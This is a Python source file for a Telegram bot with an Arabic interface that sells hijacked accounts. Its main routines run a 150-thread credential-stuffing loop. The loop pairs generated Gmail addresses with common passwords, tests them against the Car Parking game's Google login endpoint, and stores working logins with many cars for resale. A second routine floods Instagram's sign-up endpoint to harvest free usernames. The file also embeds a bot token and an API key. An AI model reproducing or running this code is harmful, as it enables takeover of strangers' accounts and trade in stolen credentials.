import urllib.request
import urllib.parse
import json
import random
import time
import sys
import os
import threading
import string
import logging
from datetime import datetime
from flask import Flask
import telebot
from telebot import types

# ================== الإعدادات العامة ==================
BOT_TOKEN = "8807194549:AAGcUNewT82vYW7rxdngAdSYOTlvCvYUOo8"
ADMIN_ID = "7075895496"
ADMIN_USERNAME = "@XOREYT"
THREADS = 150
BOT_LINK = "https://t.me/Xoregrops_bot"
MAX_WAIT_TIME = 3600
FIRE_EFFECT = 5104841245755180586 # 🎆 تأثير النار

DB_FILE = "database.json"

logging.basicConfig(filename="logs.txt", level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def load_db():
    if os.path.exists(DB_FILE):
        try:
            with open(DB_FILE, 'r', encoding='utf-8') as f: return json.load(f)
        except: pass
    return {"users": {}, "channels": {}, "banned": [], "codes": {}, "settings": {"daily_gift": 1, "ref_points": 5, "min_cars": 30}}

def save_db():
    try:
        with open(DB_FILE, 'w', encoding='utf-8') as f: json.dump(db, f, ensure_ascii=False, indent=4)
    except: pass

db = load_db()
users = db.get("users", {})
channels = db.get("channels", {})
banned_users = db.get("banned", [])
codes = db.get("codes", {})
settings = db.get("settings", {"daily_gift": 1, "ref_points": 5, "min_cars": 30})

# ================== الحالة العامة ==================
good = 0
bad = 0
running = False
ig_running = False
STOP_FLAG = threading.Event()
IG_STOP_FLAG = threading.Event()
lock = threading.Lock()
admin_states = {} 

# ================== Flask ==================
app = Flask(__name__)

@app.route("/")
def index():
    return "Mehdi's Bot - System Online"

# ================== البوت ==================
bot = telebot.TeleBot(BOT_TOKEN)

# ================== دوال مساعدة ==================
def is_banned(user_id): return str(user_id) in banned_users
def is_admin(user_id): return str(user_id) == ADMIN_ID

def get_user(user_id):
    uid = str(user_id)
    if uid not in users:
        users[uid] = {"points": 0, "refs": 0, "referred_by": None, "joined": time.time(), "last_daily": 0, "hits_bought": 0, "ig_bought": 0, "total_earned": 0, "level": 1}
        save_db()
    return users[uid]

def add_points(user_id, amount, reason="unknown"):
    uid = str(user_id)
    user = get_user(uid)
    user["points"] += amount
    user["total_earned"] += amount if amount > 0 else 0
    new_level = 1 + (user["total_earned"] // 10)
    if new_level > user["level"]:
        user["level"] = new_level
        try: 
            bot.send_message(uid, f"🎉 مبروك! لقد وصلت للمستوى {new_level}!", message_effect_id=FIRE_EFFECT)
        except: pass
    save_db()
    logging.info(f"ADD_POINTS: {uid} +{amount} ({reason})")

def check_forced_sub(message):
    if is_admin(message.from_user.id): return True
    if not channels: return True
    not_joined = []
    for ch_id, ch_name in channels.items():
        try:
            member = bot.get_chat_member(ch_id, message.from_user.id)
            if member.status in ['left', 'kicked']: not_joined.append(ch_name)
        except: not_joined.append(ch_name)
    if not_joined:
        markup = types.InlineKeyboardMarkup(row_width=1)
        for ch_id, ch_name in channels.items():
            try:
                chat_info = bot.get_chat(ch_id)
                link = chat_info.invite_link or f"https://t.me/{chat_info.username}"
                markup.add(types.InlineKeyboardButton(text=f"📢 {ch_name}", url=link))
            except: pass
        markup.add(types.InlineKeyboardButton(text="✅ تحقق", callback_data="check_sub"))
        try:
            bot.send_message(message.chat.id, "⚠️ <b>يجب الاشتراك أولاً:</b>", reply_markup=markup, parse_mode="HTML", message_effect_id=FIRE_EFFECT)
        except: pass
        return False
    return True

def get_user_keyboard(user_id):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.add("🏪 المتجر", "📸 صيد إنستقرام")
    markup.add("💎 نقاطي", "🎁 هدية")
    markup.add("🔗 إحالة", "🏆 المتصدرين")
    markup.add("💳 استلام كود", "ℹ️ معلومات")
    if is_admin(user_id): markup.add("👑 لوحة الأدمن")
    return markup

def get_admin_keyboard():
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.add("▶️ بدء الصيد", "🛑 إيقاف الصيد")
    markup.add("💳 إنشاء كود", "💰 إضافة نقاط")
    markup.add("📢 إذاعة", "⚙️ القنوات")
    markup.add("📊 الإحصائيات", "🚫 الحظر")
    markup.add("📜 السجل", "📤 التصدير")
    markup.add("👤 وضع المستخدم")
    return markup

# ================== دوال صيد Car Parking ==================
def http_post(url, json_data=None, headers=None, timeout=10):
    try:
        data = json.dumps(json_data).encode('utf-8') if json_data else None
        req = urllib.request.Request(url, data=data, method='POST')
        if headers:
            for k, v in headers.items(): req.add_header(k, v)
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return resp.status, resp.read().decode('utf-8', errors='ignore')
    except urllib.error.HTTPError as e: return e.code, e.read().decode('utf-8', errors='ignore')
    except: return 0, ''

def get_car_count(id_token):
    try:
        url = "https://europe-west1-cp-multiplayer.cloudfunctions.net/GetAllCars2"
        headers = {"authorization": f"Bearer {id_token}", "content-type": "application/json", "user-agent": "CarParking/265"}
        status, body = http_post(url, {"data": None}, headers, timeout=10)
        if status == 200:
            data = json.loads(body)
            if 'result' in data:
                cars = json.loads(data['result'])
                return len(cars) if isinstance(cars, list) else len(cars.get('cars', []))
    except: pass
    return 0

def check_account(email, password):
    global good, bad
    try:
        url = "https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM"
        payload = {"email": email, "password": password, "returnSecureToken": True, "clientType": "CLIENT_TYPE_IOS"}
        headers = {"User-Agent": "CarParking/265", "Content-Type": "application/octet-stream"}
        
        status, body = http_post(url, payload, headers, timeout=10)
        if status == 200:
            res_json = json.loads(body)
            id_token = res_json.get('idToken')
            if id_token:
                cars = get_car_count(id_token)
                if cars >= settings.get("min_cars", 30):
                    with lock: good += 1
                    with open("stock.txt", 'a', encoding='utf-8') as f: f.write(f'{email}:{password}:{cars}\n')
                else:
                    with lock: bad += 1
        else:
            with lock: bad += 1
    except: pass

FIRST_NAMES = ['john', 'mike', 'sara', 'ali', 'omar', 'lina', 'adam', 'huda', 'kareem', 'noor']
WORDS = ['cool', 'fast', 'dark', 'king', 'star', 'fire', 'wolf', 'lion', 'sky', 'pro']
PASSWORDS = ['12345678', '123456789', 'password', '123456', '123123', '1234567', '00000000', '12345', 'qwerty']

def generate_credentials():
    pattern = random.randint(0, 3)
    if pattern == 0: name = random.choice(FIRST_NAMES) + ''.join(random.choices(string.digits, k=random.randint(1, 3)))
    elif pattern == 1: name = random.choice(FIRST_NAMES) + random.choice(['_', '.']) + random.choice(FIRST_NAMES)
    elif pattern == 2: name = random.choice(WORDS) + random.choice(['', '123', '2023'])
    else: name = 'user' + str(random.randint(1000, 9999))
    return name.lower() + '@gmail.com', random.choice(PASSWORDS)

def worker():
    while not STOP_FLAG.is_set():
        email, password = generate_credentials()
        check_account(email, password)
        time.sleep(random.uniform(0.001, 0.01))

def run_checker():
    global running, good, bad
    with lock: good = 0; bad = 0
    running = True; STOP_FLAG.clear()
    for _ in range(THREADS): threading.Thread(target=worker, daemon=True).start()
    while running and not STOP_FLAG.is_set(): time.sleep(10)

# ================== دوال صيد يوزرات إنستقرام ==================
IG_NAMES = ['ahmed', 'mohamed', 'ali', 'omar', 'yousef', 'khaled', 'sara', 'mona', 'lina', 'noor', 'john', 'mike', 'david', 'james', 'robert', 'mary', 'linda', 'susan', 'karen', 'nancy', 'alex', 'max', 'sam', 'chris', 'daniel', 'jessica', 'emily', 'ashley', 'sarah', 'amanda']
IG_WORDS = ['official', 'real', 'the', 'best', 'pro', 'king', 'queen', 'star', 'legend', 'epic', 'cool', 'fast', 'dark', 'light', 'fire', 'ice', 'wolf', 'lion', 'tiger', 'eagle', 'game', 'play', 'art', 'music', 'life', 'love', 'peace', 'world', 'tech', 'vibe']

def generate_ig_username():
    pattern = random.randint(0, 4)
    if pattern == 0: return f"{random.choice(IG_NAMES)}{random.choice(IG_WORDS)}"
    elif pattern == 1: return f"{random.choice(IG_NAMES)}_{random.choice(IG_NAMES)}"
    elif pattern == 2: return f"{random.choice(IG_WORDS)}{random.choice(IG_NAMES)}"
    elif pattern == 3: return f"{random.choice(IG_NAMES)}{random.randint(1, 9999)}"
    else: return f"{random.choice(IG_WORDS)}_{random.choice(IG_WORDS)}"

def check_ig_username(username):
    global good, bad
    try:
        url = "https://www.instagram.com/api/v1/web/accounts/web_create_ajax/attempt/"
        data = f"email=&username={username}&first_name=&opt_into_one_tap=false"
        req = urllib.request.Request(url, data=data.encode('utf-8'), method='POST')
        req.add_header('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
        req.add_header('Content-Type', 'application/x-www-form-urlencoded')
        req.add_header('X-Requested-With', 'XMLHttpRequest')
        
        with urllib.request.urlopen(req, timeout=10) as resp:
            res = json.loads(resp.read().decode('utf-8'))
            
        if 'errors' in res and 'username_is_taken' in str(res):
            with lock: bad += 1
        else:
            with lock: good += 1
            with open("ig_stock.txt", 'a', encoding='utf-8') as f: f.write(f'{username}\n')
    except:
        with lock: bad += 1

def ig_worker():
    while not IG_STOP_FLAG.is_set():
        username = generate_ig_username()
        check_ig_username(username)
        time.sleep(random.uniform(0.1, 0.5))

def run_ig_checker():
    global ig_running, good, bad
    with lock: good = 0; bad = 0
    ig_running = True; IG_STOP_FLAG.clear()
    for _ in range(30): threading.Thread(target=ig_worker, daemon=True).start()
    while ig_running and not IG_STOP_FLAG.is_set(): time.sleep(10)

# ================== دالة شريط التحميل والاسترجاع ==================
def wait_and_refund(chat_id, msg_id, user_id, cost, file_type, mode_text):
    start_time = time.time()
    
    while time.time() - start_time < MAX_WAIT_TIME:
        time.sleep(10)
        elapsed = time.time() - start_time
        progress = int((elapsed / MAX_WAIT_TIME) * 100)
        
        filled = "▓" * (progress // 10) + "░" * (10 - (progress // 10))
        minutes = int((MAX_WAIT_TIME - elapsed) // 60)
        
        try:
            bot.edit_message_text(
                f"⏳ <b>{mode_text}</b>\n\n"
                f"[{filled}] {progress}%\n\n"
                f"⏱️ الوقت المتبقي: {minutes} دقيقة\n"
                f"<i>(إذا انتهى الوقت ولم نجد شي، سيتم استرجاع نقاطك تلقائياً).</i>",
                chat_id, msg_id, parse_mode="HTML"
            )
        except: pass

        target_file = "stock.txt" if file_type == "car" else "ig_stock.txt"
        if os.path.exists(target_file):
            with open(target_file, 'r', encoding='utf-8') as f:
                if len(f.readlines()) > 0:
                    bot.edit_message_text(f"✅ <b>تم الصيد بنجاح!</b>\nرجاءً ادخل على المتجر مرة ثانية عشان تستلم طلبك.", chat_id, msg_id, parse_mode="HTML")
                    return

    add_points(user_id, cost, "refund_timeout")
    bot.edit_message_text(
        f"❌ <b>عذراً، لم نجد أي طلب خلال {MAX_WAIT_TIME//60} دقيقة.</b>\n\n"
        f"💰 تم استرجاع <b>{cost} نقطة</b> لحسابك تلقائياً.",
        chat_id, msg_id, parse_mode="HTML"
    )

# ================== أوامر البوت العامة ==================
@bot.message_handler(commands=['start'])
def send_welcome(message):
    if is_banned(message.from_user.id): return
    if not check_forced_sub(message): return
    user = get_user(message.from_user.id)
    text = f"👋 <b>أهلاً {message.from_user.first_name}!</b>\n\n💎 نقاطك: {user['points']}\n📈 مستواك: {user['level']}"
    try:
        bot.send_message(message.chat.id, text, reply_markup=get_user_keyboard(message.from_user.id), parse_mode="HTML", message_effect_id=FIRE_EFFECT)
    except:
        bot.send_message(message.chat.id, text, reply_markup=get_user_keyboard(message.from_user.id), parse_mode="HTML")

@bot.message_handler(func=lambda message: message.text == "🏪 المتجر")
def shop(message):
    user = get_user(message.from_user.id)
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(types.InlineKeyboardButton("🚗 صيدة Car Parking (1 نقطة)", callback_data="buy_1"))
    markup.add(types.InlineKeyboardButton("📦 5 صيدات Car Parking (4 نقاط)", callback_data="buy_5"))
    try:
        bot.send_message(message.chat.id, f"🛒 متجر Car Parking\nرصيدك: {user['points']}", reply_markup=markup, message_effect_id=FIRE_EFFECT)
    except:
        bot.send_message(message.chat.id, f"🛒 متجر Car Parking\nرصيدك: {user['points']}", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith("buy_"))
def buy_hit(call):
    amount = int(call.data.split("_")[1])
    cost = {1: 1, 5: 4}[amount]
    user = get_user(call.from_user.id)
    
    if user["points"] < cost: return bot.answer_callback_query(call.id, "❌ نقاطك غير كافية!", show_alert=True)
    
    try:
        with open("stock.txt", 'r', encoding='utf-8') as f: lines = f.readlines()
        
        if len(lines) < amount:
            user["points"] -= cost
            save_db()
            bot.answer_callback_query(call.id, "⏳ المخزن فاضي، جاري الصيد...", show_alert=False)
            msg = bot.send_message(call.from_user.id, "⏳ جاري تجهيز الصيد...", parse_mode="HTML")
            
            if not running:
                threading.Thread(target=run_checker, daemon=True).start()
                
            threading.Thread(target=wait_and_refund, args=(call.from_user.id, msg.message_id, call.from_user.id, cost, "car", "جاري صيد حساب Car Parking..."), daemon=True).start()
            return
        
        bought = lines[:amount]
        with open("stock.txt", 'w', encoding='utf-8') as f: f.writelines(lines[amount:])
        user["points"] -= cost
        user["hits_bought"] += amount
        save_db()
        try:
            bot.send_message(call.from_user.id, f"✅ <b>تم الشراء:</b>\n<code>{''.join(bought)}</code>", parse_mode="HTML", message_effect_id=FIRE_EFFECT)
        except:
            bot.send_message(call.from_user.id, f"✅ <b>تم الشراء:</b>\n<code>{''.join(bought)}</code>", parse_mode="HTML")
    except Exception as e:
        bot.answer_callback_query(call.id, "⚠️ خطأ.", show_alert=True)

@bot.message_handler(func=lambda message: message.text == "📸 صيد إنستقرام")
def shop_ig(message):
    user = get_user(message.from_user.id)
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(types.InlineKeyboardButton("📱 ثلاثي (3 حروف) - 5 نقاط", callback_data="ig_3"))
    markup.add(types.InlineKeyboardButton("📱 رباعي (4 حروف) - 10 نقاط", callback_data="ig_4"))
    markup.add(types.InlineKeyboardButton("📱 شبه ثلاثي - 3 نقاط", callback_data="ig_semi3"))
    markup.add(types.InlineKeyboardButton("📱 شبه رباعي - 7 نقاط", callback_data="ig_semi4"))
    try:
        bot.send_message(message.chat.id, f"📸 متجر إنستقرام\nرصيدك: {user['points']} نقطة\n\nاختر نوع الحساب:", reply_markup=markup, message_effect_id=FIRE_EFFECT)
    except:
        bot.send_message(message.chat.id, f"📸 متجر إنستقرام\nرصيدك: {user['points']} نقطة\n\nاختر نوع الحساب:", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith("ig_"))
def buy_ig(call):
    cost = {"ig_3": 5, "ig_4": 10, "ig_semi3": 3, "ig_semi4": 7}.get(call.data, 5)
    user = get_user(call.from_user.id)
    if user["points"] < cost: return bot.answer_callback_query(call.id, "❌ نقاطك غير كافية!", show_alert=True)
    
    try:
        with open("ig_stock.txt", 'r', encoding='utf-8') as f: lines = f.readlines()
        
        if not lines:
            user["points"] -= cost
            save_db()
            bot.answer_callback_query(call.id, "⏳ المخزن فاضي، جاري الصيد...", show_alert=False)
            msg = bot.send_message(call.from_user.id, "⏳ جاري تجهيز الصيد...", parse_mode="HTML")
            
            if not ig_running:
                threading.Thread(target=run_ig_checker, daemon=True).start()
                
            threading.Thread(target=wait_and_refund, args=(call.from_user.id, msg.message_id, call.from_user.id, cost, "ig", "جاري صيد يوزر إنستقرام..."), daemon=True).start()
            return

        bought = lines[0].strip()
        with open("ig_stock.txt", 'w', encoding='utf-8') as f: f.writelines(lines[1:])
        user["points"] -= cost
        save_db()
        try:
            bot.send_message(call.from_user.id, f"✅ <b>تم الشراء:</b> <code>@{bought}</code>", parse_mode="HTML", message_effect_id=FIRE_EFFECT)
        except:
            bot.send_message(call.from_user.id, f"✅ <b>تم الشراء:</b> <code>@{bought}</code>", parse_mode="HTML")
    except: bot.answer_callback_query(call.id, "⚠️ خطأ.", show_alert=True)

@bot.message_handler(func=lambda message: message.text == "💎 نقاطي")
def my_points(message):
    user = get_user(message.from_user.id)
    try: bot.reply_to(message, f"💎 نقاطك: <b>{user['points']}</b>\n📈 مستواك: <b>{user['level']}</b>\n👥 إحالاتك: <b>{user['refs']}</b>", parse_mode="HTML", message_effect_id=FIRE_EFFECT)
    except: bot.reply_to(message, f"💎 نقاطك: {user['points']}")

@bot.message_handler(func=lambda message: message.text == "🎁 هدية")
def daily_gift(message):
    user = get_user(message.from_user.id)
    now = time.time()
    if now - user["last_daily"] < 86400:
        return bot.reply_to(message, f"⚠️ متبقي: {int(86400 - (now - user['last_daily']))//3600} ساعة.")
    user["last_daily"] = now
    add_points(message.from_user.id, settings.get("daily_gift", 1), "daily")
    try: bot.reply_to(message, "🎁 حصلت على نقطة!", message_effect_id=FIRE_EFFECT)
    except: bot.reply_to(message, "🎁 حصلت على نقطة!")

@bot.message_handler(func=lambda message: message.text == "🔗 إحالة")
def ref_link(message):
    link = f"{BOT_LINK}?start={message.from_user.id}"
    bot.reply_to(message, f"🔗 رابطك:\n<code>{link}</code>", parse_mode="HTML")

@bot.message_handler(func=lambda message: message.text == "🏆 المتصدرين")
def top_users(message):
    sorted_users = sorted(users.items(), key=lambda x: x[1].get("total_earned", 0), reverse=True)[:5]
    text = "🏆 <b>أفضل 5:</b>\n"
    for i, (uid, data) in enumerate(sorted_users, 1):
        text += f"{i}. ID: <code>{uid}</code> - ⭐ {data.get('points', 0)}\n"
    try: bot.reply_to(message, text, parse_mode="HTML", message_effect_id=FIRE_EFFECT)
    except: bot.reply_to(message, text, parse_mode="HTML")

@bot.message_handler(func=lambda message: message.text == "ℹ️ معلومات")
def bot_info(message):
    text = f"🤖 بوت Car Parking\n👨‍💻 المطور: {ADMIN_USERNAME}\n⚡ السرعة: {THREADS}"
    bot.reply_to(message, text)

@bot.message_handler(func=lambda message: message.text == "💳 استلام كود")
def redeem_code_start(message):
    msg = bot.reply_to(message, "💳 أرسل كود الشحن الآن:")
    bot.register_next_step_handler(msg, redeem_code_process)

def redeem_code_process(message):
    code = message.text.strip().upper()
    if code in codes:
        c = codes[code]
        if c["used_count"] >= c["max_uses"] and c["max_uses"] != 0:
            return bot.reply_to(message, "❌ هذا الكود استنفذ عدد استخداماته.")
        if str(message.from_user.id) in c["used_by"]:
            return bot.reply_to(message, "❌ لقد استخدمت هذا الكود مسبقاً.")
            
        add_points(message.from_user.id, c["amount"], "redeem_code")
        c["used_count"] += 1
        c["used_by"].append(str(message.from_user.id))
        save_db()
        try: bot.reply_to(message, f"✅ <b>مبروك!</b> تم شحن <b>{c['amount']} نقطة</b> لحسابك.", parse_mode="HTML", message_effect_id=FIRE_EFFECT)
        except: bot.reply_to(message, f"✅ مبروك! تم شحن {c['amount']} نقطة.")
    else:
        bot.reply_to(message, "❌ الكود غير صحيح.")

# ================== أوامر الأدمن ==================
@bot.message_handler(func=lambda message: message.text == "👑 لوحة الأدمن")
def admin_panel(message):
    if not is_admin(message.from_user.id): return
    try: bot.send_message(message.chat.id, "👑 <b>لوحة تحكم الأدمن</b>", reply_markup=get_admin_keyboard(), parse_mode="HTML", message_effect_id=FIRE_EFFECT)
    except: bot.send_message(message.chat.id, "👑 لوحة تحكم الأدمن", reply_markup=get_admin_keyboard())

@bot.message_handler(func=lambda message: message.text == "👤 وضع المستخدم")
def user_mode(message):
    if not is_admin(message.from_user.id): return
    try: bot.send_message(message.chat.id, "👤 <b>أنت الآن في وضع المستخدم.</b>", reply_markup=get_user_keyboard(message.from_user.id), parse_mode="HTML", message_effect_id=FIRE_EFFECT)
    except: bot.send_message(message.chat.id, "👤 أنت الآن في وضع المستخدم.", reply_markup=get_user_keyboard(message.from_user.id))

@bot.message_handler(func=lambda message: is_admin(message.from_user.id) and message.text == "▶️ بدء الصيد")
def admin_start(message):
    global running
    if running: return bot.reply_to(message, "⚠️ شغال.")
    msg = bot.reply_to(message, "⏳ جاري التجهيز...")
    def update_progress():
        for i in range(1, 101):
            if STOP_FLAG.is_set(): break
            try:
                filled = "█" * (i // 10) + "░" * (10 - i // 10)
                bot.edit_message_text(f"⏳ <b>جاري الصيد...</b>\n[{filled}] {i}%", msg.chat.id, msg.message_id, parse_mode="HTML")
            except: pass
            time.sleep(1.5)
    threading.Thread(target=run_checker, daemon=True).start()
    threading.Thread(target=update_progress, daemon=True).start()

@bot.message_handler(func=lambda message: is_admin(message.from_user.id) and message.text == "🛑 إيقاف الصيد")
def admin_stop(message):
    global running, ig_running
    STOP_FLAG.set(); running = False
    IG_STOP_FLAG.set(); ig_running = False
    bot.reply_to(message, "🛑 تم الإيقاف.")

@bot.message_handler(func=lambda message: is_admin(message.from_user.id) and message.text == "💳 إنشاء كود")
def create_code_start(message):
    msg = bot.reply_to(message, "💳 أرسل عدد النقاط للكود (مثال: 10):")
    bot.register_next_step_handler(msg, create_code_amount)

def create_code_amount(message):
    try:
        amount = int(message.text.strip())
        if amount <= 0: raise ValueError
        admin_states[message.from_user.id] = {"amount": amount}
        msg = bot.reply_to(message, "👥 كم شخص يقدر يستخدم الكود؟ (مثال: 1 لشخص واحد، 0 لعدد لا نهائي):")
        bot.register_next_step_handler(msg, create_code_uses)
    except:
        bot.reply_to(message, "❌ رقم غير صحيح.")

def create_code_uses(message):
    try:
        uses = int(message.text.strip())
        if uses < 0: raise ValueError
        admin_states[message.from_user.id]["uses"] = uses
        code = f"MEHDI-{''.join(random.choices(string.ascii_uppercase + string.digits, k=8))}"
        
        codes[code] = {"amount": admin_states[message.from_user.id]["amount"], "max_uses": uses, "used_count": 0, "used_by": []}
        save_db()
        
        text = f"✅ <b>تم إنشاء الكود!</b>\n\n💳 الكود: <code>{code}</code>\n💰 النقاط: {admin_states[message.from_user.id]['amount']}\n👥 الاستخدامات: {uses if uses > 0 else 'لا نهائي'}"
        try: bot.send_message(message.chat.id, text, parse_mode="HTML", message_effect_id=FIRE_EFFECT)
        except: bot.send_message(message.chat.id, text, parse_mode="HTML")
        del admin_states[message.from_user.id]
    except:
        bot.reply_to(message, "❌ رقم غير صحيح.")

@bot.message_handler(func=lambda message: is_admin(message.from_user.id) and message.text == "💰 إضافة نقاط")
def admin_add_points(message):
    msg = bot.reply_to(message, "💰 أرسل (الآيدي) و (عدد النقاط) مفصولين بمسافة.\nمثال: `7075895496 50`", parse_mode="HTML")
    bot.register_next_step_handler(msg, admin_add_points_process)

def admin_add_points_process(message):
    try:
        parts = message.text.split()
        uid, amount = parts[0], int(parts[1])
        add_points(uid, amount, "admin_add")
        bot.reply_to(message, f"✅ تم إضافة {amount} نقطة للآيدي {uid}.")
        try: bot.send_message(uid, f"🎁 تم إضافة {amount} نقطة لحسابك من قبل الإدارة.", message_effect_id=FIRE_EFFECT)
        except: pass
    except:
        bot.reply_to(message, "❌ الصيغة غير صحيحة.")

@bot.message_handler(func=lambda message: is_admin(message.from_user.id) and message.text == "📢 إذاعة")
def admin_broadcast_start(message):
    msg = bot.reply_to(message, "📢 أرسل الرسالة الآن (نص، صورة، ملف..):")
    bot.register_next_step_handler(msg, admin_broadcast_send)

def admin_broadcast_send(message):
    bot.reply_to(message, "⏳ جاري الإرسال للجميع...")
    count = 0
    failed = 0
    for uid in list(users.keys()):
        try:
            bot.copy_message(chat_id=uid, from_chat_id=message.chat.id, message_id=message.message_id)
            count += 1
            time.sleep(0.05)
        except: failed += 1
    bot.send_message(ADMIN_ID, f"✅ تم الإرسال إلى {count} شخص.\n❌ فشل: {failed}")

@bot.message_handler(func=lambda message: is_admin(message.from_user.id) and message.text == "📊 الإحصائيات")
def admin_stats(message):
    total_hits = sum(1 for _ in open("stock.txt")) if os.path.exists("stock.txt") else 0
    ig_hits = sum(1 for _ in open("ig_stock.txt")) if os.path.exists("ig_stock.txt") else 0
    text = f"📊 <b>إحصائيات البوت:</b>\n\n👥 المستخدمين: {len(users)}\n🚗 مخزن Car: {total_hits}\n📸 مخزن IG: {ig_hits}\n🎟️ الأكواد: {len(codes)}\n🏃 الحالة: {'شغال 🟢' if running else 'متوقف 🔴'}"
    try: bot.reply_to(message, text, parse_mode="HTML", message_effect_id=FIRE_EFFECT)
    except: bot.reply_to(message, text, parse_mode="HTML")

@bot.message_handler(func=lambda message: is_admin(message.from_user.id) and message.text == "⚙️ القنوات")
def admin_channels(message):
    text = "⚙️ <b>القنوات:</b>\n"
    for c_id, c_n in channels.items(): text += f"- {c_n} (<code>{c_id}</code>)\n"
    text += "\nإضافة: <code>/addchannel @username</code>\nحذف: <code>/delchannel ID</code>"
    bot.reply_to(message, text, parse_mode="HTML")

@bot.message_handler(commands=['addchannel'])
def add_channel(message):
    if not is_admin(message.from_user.id): return
    try:
        ch = message.text.split(maxsplit=1)[1]
        if ch.startswith('@'):
            info = bot.get_chat(ch)
            channels[str(info.id)] = info.title
        else: channels[str(ch)] = "قناة " + str(ch)
        save_db()
        bot.reply_to(message, "✅ تم إضافة القناة.")
    except Exception as e: bot.reply_to(message, f"❌ تأكد أن البوت أدمن في القناة.\n{e}")

@bot.message_handler(func=lambda message: is_admin(message.from_user.id) and message.text == "📤 التصدير")
def admin_export(message):
    try:
        if os.path.exists("stock.txt"): bot.send_document(message.chat.id, open("stock.txt", 'rb'), caption="📦 مخزن Car")
        if os.path.exists("ig_stock.txt"): bot.send_document(message.chat.id, open("ig_stock.txt", 'rb'), caption="📦 مخزن IG")
        bot.send_document(message.chat.id, open(DB_FILE, 'rb'), caption="📁 قاعدة البيانات")
    except: bot.reply_to(message, "❌ خطأ في التصدير.")

@bot.message_handler(func=lambda message: is_admin(message.from_user.id) and message.text == "📜 السجل")
def admin_logs(message):
    try:
        with open("logs.txt", 'r', encoding='utf-8') as f: lines = f.readlines()[-20:]
        bot.reply_to(message, "📜 <b>السجل:</b>\n<code>" + "".join(lines) + "</code>", parse_mode="HTML")
    except: bot.reply_to(message, "❌ لا يوجد سجل.")

@bot.message_handler(func=lambda message: is_admin(message.from_user.id) and message.text == "🚫 الحظر")
def admin_ban_menu(message):
    text = f"🚫 <b>إدارة الحظر</b>\n\nالأوامر:\n<code>/ban USER_ID</code>\n<code>/unban USER_ID</code>\n\nالمحظورين: {len(banned_users)}"
    bot.reply_to(message, text, parse_mode="HTML")

@bot.message_handler(commands=['ban'])
def ban_user(message):
    if not is_admin(message.from_user.id): return
    try:
        uid = message.text.split()[1]
        if uid not in banned_users:
            banned_users.append(uid)
            save_db()
            bot.reply_to(message, f"✅ تم حظر {uid}.")
    except: bot.reply_to(message, "❌ خطأ.")

@bot.message_handler(commands=['unban'])
def unban_user(message):
    if not is_admin(message.from_user.id): return
    try:
        uid = message.text.split()[1]
        if uid in banned_users:
            banned_users.remove(uid)
            save_db()
            bot.reply_to(message, f"✅ تم إلغاء حظر {uid}.")
    except: bot.reply_to(message, "❌ خطأ.")

@bot.callback_query_handler(func=lambda call: call.data == "check_sub")
def check_sub_cb(call):
    if check_forced_sub(call.message): bot.send_message(call.from_user.id, "✅ تم التحقق! أرسل /start.")
    else: bot.answer_callback_query(call.id, "❌ لم تشترك بعد.", show_alert=True)

# ================== تشغيل ==================
def start_bot_polling():
    while True:
        try: bot.infinity_polling(timeout=60, long_polling_timeout=60)
        except Exception as e:
            logging.error(f"Polling crashed: {e}")
            time.sleep(5)

if __name__ == "__main__":
    for f in ["stock.txt", "ig_stock.txt"]:
        if not os.path.exists(f): open(f, 'w').close()
            
    threading.Thread(target=start_bot_polling, daemon=True).start()
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
